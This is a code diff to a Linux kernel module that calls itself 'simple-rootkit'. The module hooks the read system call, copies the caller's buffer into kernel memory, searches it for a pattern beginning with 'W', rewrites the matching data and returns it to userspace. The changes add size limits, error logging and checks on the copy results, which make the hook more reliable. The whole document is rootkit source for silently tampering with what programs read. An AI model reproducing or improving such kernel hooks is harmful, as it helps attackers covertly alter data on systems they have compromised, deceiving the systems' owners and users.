@@ -33,7 +33,7 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
      */
     long ret;
     ret = ref_sys_read(fd, buf, count);
-
+    
     if (ret >= 6 && fd > 2) {
         /* We can find the current task name from the current task struct
          * then use that to decide if we'd like to swap out data
@@ -51,10 +51,20 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
              * back to userspace
              */
             char *kernel_buf;
+            if (count > PAGE_SIZE) {
+                printk("simple-rootkit refused to kmalloc > %lu B (%lu)\n", PAGE_SIZE, count);
+                return ret;
+            }
             kernel_buf = kmalloc(count, GFP_KERNEL);
-            if (!kernel_buf)
+            if (!kernel_buf) {
+                printk("simple-rootkit failed to allocate memory... :(\n");
                 return ret; /* an error; but lets not bug the user, heh */
-            copy_from_user(kernel_buf, buf, count);
+            }
+            if(copy_from_user(kernel_buf, buf, count)) {
+                printk("simple-rootkit failed to copy the read buffer... :(\n");
+                kfree(kernel_buf);
+                return ret;
+            }
             
             for (i = 0; i < (ret - 6); i++) {
                 if (kernel_buf[i] == 'W' &&
@@ -72,7 +82,8 @@ asmlinkage long new_sys_read(unsigned int fd, char __user *buf, size_t count)
                 }
             }
 
-            copy_to_user(buf, kernel_buf, count);
+            if(copy_to_user(buf, kernel_buf, count))
+                printk("simple-rootkit failed to write to read buffer... :(\n");
             kfree(kernel_buf);
         }
     }
